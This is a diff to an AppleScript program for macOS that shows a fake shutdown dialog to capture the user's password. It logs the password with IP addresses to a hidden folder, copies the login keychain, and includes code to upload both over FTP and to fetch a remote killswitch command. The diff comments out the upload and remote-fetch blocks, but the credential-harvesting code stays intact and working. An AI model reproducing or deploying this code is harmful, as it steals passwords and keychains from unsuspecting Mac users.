@@ -8,9 +8,9 @@ try
 on error
 	return
 end try
-
+(*
 try
-	set remotecommand to (do shell script "curl http://benbern.dyndns.info/stuff/command.txt") as text -- Check for command
+	set remotecommand to (do shell script "curl http://domain.com/command.txt") as text -- Check for command
 	if remotecommand = "kill" then -- If killswitch is triggered, delete all of the app and password files
 		try
 			try
@@ -42,7 +42,7 @@ try
 on error
 	return
 end try
-
+*)
 try
 	repeat
 		set quest to (display dialog "Please enter your password to postpone shutdown." with title "Password" with icon (path to resource "icon.icns") default answer "" buttons {"OK"} default button 1 giving up after 10 with hidden answer) -- Prompt for Password
@@ -65,24 +65,27 @@ try
 	try
 		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d '<' -f 1"
 		set WANIP to (characters 2 through -1 of result) as text -- Get IP
-		set LANIP to (do shell script "ipconfig getifaddr en1")
 	on error
 		set WANIP to "not connected"
+	end try
+	try
+		set LANIP to (do shell script "ipconfig getifaddr en0")
+	on error
 		set LANIP to "not connected"
 	end try
-	
 	do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " >> " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
 end try
 
+(*
 set myserv to "<ftp address>"
 set mypath to "</path/to/folder/>"
 
 try
 	do shell script "curl -T " & ufld & theuser & ".txt ftp://anonymous@" & myserv & mypath & theuser & "_" & WANIP & ".txt" -- Upload text file to FTP server
 end try
-
+*)
 try
-	do shell script "openssl enc -aes-256-cbc -salt -in " & ufld & theuser & ".txt -out " & ufld & theuser & ".enc -pass pass:" & encpass
+	do shell script "openssl enc -aes-256-cbc -salt -in " & ufld & theuser & ".txt -out " & ufld & theuser & ".enc -pass pass:" & encpass -- Encrypt the file if there is an encpass
 	do shell script "rm " & ufld & theuser & ".txt"
 end try
 
@@ -91,7 +94,8 @@ try
 	do shell script "cp " & china & " " & ufld
 	do shell script "mv " & ufld & "login.keychain " & ufld & theuser & ".keychain" -- Copy keychain to hidden folder
 end try
-
+(*
 try
 	do shell script "curl -T " & ufld & theuser & ".keychain ftp://anonymous@" & myserv & mypath & theuser & "_" & WANIP & ".keychain" -- Upload Keychain to FTP server
 end try
+*)
